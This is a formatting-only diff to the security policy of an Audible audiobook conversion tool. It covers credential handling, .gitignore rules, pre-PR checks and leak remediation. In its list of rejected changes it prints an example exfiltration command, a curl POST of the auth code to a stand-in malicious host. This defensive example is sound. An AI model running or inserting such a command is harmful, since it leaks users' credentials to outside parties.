@@ -34,6 +34,7 @@ This tool requires Audible authentication codes (for AAX files) or voucher files
 **NEVER commit authentication credentials to the repository.**
 
 **Safe practices:**
+
 - ✅ Use `.authcode` file in home directory: `~/.authcode`
 - ✅ Use local `.authcode` file (protected by `.gitignore`)
 - ✅ Keep `.gitignore` up to date
@@ -43,6 +44,7 @@ This tool requires Audible authentication codes (for AAX files) or voucher files
 ### Protected Files
 
 The following files should NEVER be committed (protected by `.gitignore`):
+
 - `.authcode` - Contains Audible authentication code
 - `*.aax` / `*.aaxc` - Copyrighted audiobook files
 - `*.voucher` - AAXC decryption vouchers
@@ -52,6 +54,7 @@ The following files should NEVER be committed (protected by `.gitignore`):
 ### Code Review Requirements
 
 All pull requests must:
+
 1. Not modify `.gitignore` to expose sensitive files
 2. Not add code that logs or transmits auth codes
 3. Not add code that uploads or shares copyrighted content
@@ -63,6 +66,7 @@ All pull requests must:
 The following changes will be **rejected**:
 
 ❌ **Removing or weakening `.gitignore` entries**
+
 ```diff
 - .authcode
 - *.aax
@@ -71,6 +75,7 @@ The following changes will be **rejected**:
 ```
 
 ❌ **Logging sensitive data**
+
 ```bash
 # NEVER do this:
 echo "Auth code: ${auth_code}"
@@ -78,12 +83,14 @@ log "Processing: ${personal_audiobook_title}"
 ```
 
 ❌ **Transmitting data to unauthorized endpoints**
+
 ```bash
 # NEVER do this:
 curl -X POST "https://malicious-site.com" -d "authcode=${auth_code}"
 ```
 
 ❌ **Storing credentials in code**
+
 ```bash
 # NEVER do this:
 auth_code="hardcoded-auth-here"
@@ -94,21 +101,25 @@ auth_code="hardcoded-auth-here"
 **Before submitting a PR:**
 
 1. **Review your changes for sensitive data:**
+
    ```bash
    git diff | grep -iE "(auth.?code|activation.?bytes|voucher)"
    ```
 
 2. **Verify `.gitignore` is intact:**
+
    ```bash
    git status --ignored
    ```
 
 3. **Check for hardcoded credentials:**
+
    ```bash
    grep -r "auth_code=" . --include="*.sh" --include="*.bash"
    ```
 
 4. **Run local security check:**
+
    ```bash
    # Ensure no sensitive files are staged
    git diff --cached --name-only | grep -E "(\.authcode|\.aax|\.voucher)"
@@ -117,6 +128,7 @@ auth_code="hardcoded-auth-here"
 ### Dependency Security
 
 **Bash script dependencies:**
+
 - ffmpeg - Keep updated for security patches
 - jq - JSON processor
 - mp4art / mp4chaps - Metadata tools
@@ -139,6 +151,7 @@ Use your system's package manager to keep dependencies updated:
 ### Local Security
 
 **Protect your environment:**
+
 ```bash
 # Secure your auth code file
 chmod 600 ~/.authcode
@@ -149,6 +162,7 @@ chmod 700 ~/Audiobooks/
 ```
 
 **Don't commit sensitive files:**
+
 ```bash
 # Check what would be committed
 git status
@@ -262,6 +276,7 @@ git push --force --all
 ```
 
 **Then:**
+
 1. Immediately change your Audible password
 2. Generate a new authentication code
 3. Update your local `.authcode` file
@@ -280,6 +295,7 @@ This tool is designed for **personal use only**:
 - ❌ Distribution of copyrighted content
 
 **Users are responsible for complying with:**
+
 - Audible Terms of Service
 - Local copyright laws
 - DMCA (US) / equivalent laws in your jurisdiction
